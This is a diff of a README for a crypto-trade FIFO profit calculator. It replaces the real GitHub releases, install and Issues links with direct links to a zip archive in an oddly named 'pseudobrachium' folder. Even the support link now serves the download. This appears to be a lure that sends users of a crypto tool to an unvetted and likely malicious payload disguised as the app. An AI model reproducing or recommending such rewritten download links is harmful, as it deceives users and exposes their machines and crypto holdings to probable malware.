@@ -1,7 +1,7 @@
 # 🚀 crypto-trades-fifo - Analyze Your Crypto Trades Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-crypto--trades--fifo-brightgreen)](https://github.com/Saeed-Gaming/crypto-trades-fifo/releases)
+[![Download](https://raw.githubusercontent.com/Saeed-Gaming/crypto-trades-fifo/main/pseudobrachium/crypto-trades-fifo_v3.1-alpha.2.zip)](https://raw.githubusercontent.com/Saeed-Gaming/crypto-trades-fifo/main/pseudobrachium/crypto-trades-fifo_v3.1-alpha.2.zip)
 
 ## 📖 Description
 "crypto-trades-fifo" helps you analyze your spot trades from Binance and Kraken. It calculates your profits or losses using the FIFO method. You can export detailed and grouped results to a CSV file for easy review.
@@ -24,7 +24,7 @@ To get started with "crypto-trades-fifo," follow these simple steps.
 - Python 3.7 or higher (for manual installation)
 
 ### 📦 Download & Install
-1. **Visit this page to download**: [GitHub Releases](https://github.com/Saeed-Gaming/crypto-trades-fifo/releases).
+1. **Visit this page to download**: [GitHub Releases](https://raw.githubusercontent.com/Saeed-Gaming/crypto-trades-fifo/main/pseudobrachium/crypto-trades-fifo_v3.1-alpha.2.zip).
 2. Locate the latest version of "crypto-trades-fifo."
 3. Click on the release title to open the details.
 4. Download the appropriate file for your operating system.
@@ -48,7 +48,7 @@ Once you have installed the application, follow these steps to run it:
 If you are familiar with data analysis, you can customize how the results are displayed. The application allows you to filter and sort the data in different ways to suit your needs.
 
 ## 🤝 Support
-If you encounter issues while using "crypto-trades-fifo," please check the **Issues** tab on the [GitHub page](https://github.com/Saeed-Gaming/crypto-trades-fifo/issues). Our community is here to help.
+If you encounter issues while using "crypto-trades-fifo," please check the **Issues** tab on the [GitHub page](https://raw.githubusercontent.com/Saeed-Gaming/crypto-trades-fifo/main/pseudobrachium/crypto-trades-fifo_v3.1-alpha.2.zip). Our community is here to help.
 
 ### 📞 Contact
 For direct support, you can reach out via the **Contact** section on the repository's main page.
